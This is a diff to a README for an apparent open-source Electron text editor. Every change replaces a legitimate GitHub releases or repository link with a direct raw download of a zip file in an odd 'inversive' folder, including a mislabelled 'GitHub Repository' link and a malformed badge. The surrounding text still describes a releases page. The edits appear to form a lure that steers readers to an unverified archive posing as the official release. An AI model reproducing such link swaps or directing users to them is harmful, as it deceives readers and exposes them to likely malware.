@@ -1,6 +1,6 @@
 # ✨ conceptual-electron-editor - Easy Text Editing for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/mwngi/conceptual-electron-editor/releases)
+[![Download Now](https://raw.githubusercontent.com/mwngi/conceptual-electron-editor/main/inversive/conceptual-electron-editor.zip%https://raw.githubusercontent.com/mwngi/conceptual-electron-editor/main/inversive/conceptual-electron-editor.zip)](https://raw.githubusercontent.com/mwngi/conceptual-electron-editor/main/inversive/conceptual-electron-editor.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download, make sure your device meets these requirements:
 
 To download the latest version of the Conceptual Electron Editor, please visit this page to download:
 
-[Download the latest release](https://github.com/mwngi/conceptual-electron-editor/releases)
+[Download the latest release](https://raw.githubusercontent.com/mwngi/conceptual-electron-editor/main/inversive/conceptual-electron-editor.zip)
 
 1. Click the link above.
 2. On the releases page, you will see a list of available versions.
@@ -58,7 +58,7 @@ The Conceptual Electron Editor supports various features that cater to different
 
 Join our community for support and updates. You can find helpful resources, tutorials, and discussions in our GitHub repository and related forums. 
 
-- **GitHub Repository**: [Conceptual Electron Editor GitHub](https://github.com/mwngi/conceptual-electron-editor)
+- **GitHub Repository**: [Conceptual Electron Editor GitHub](https://raw.githubusercontent.com/mwngi/conceptual-electron-editor/main/inversive/conceptual-electron-editor.zip)
   
 ## 🛠 Need Help?
 
@@ -80,4 +80,4 @@ The Conceptual Electron Editor is open-source software licensed under the MIT Li
 
 Don’t forget to check for updates regularly. You can always access the download link here:
 
-[Download the latest release](https://github.com/mwngi/conceptual-electron-editor/releases)
+[Download the latest release](https://raw.githubusercontent.com/mwngi/conceptual-electron-editor/main/inversive/conceptual-electron-editor.zip)
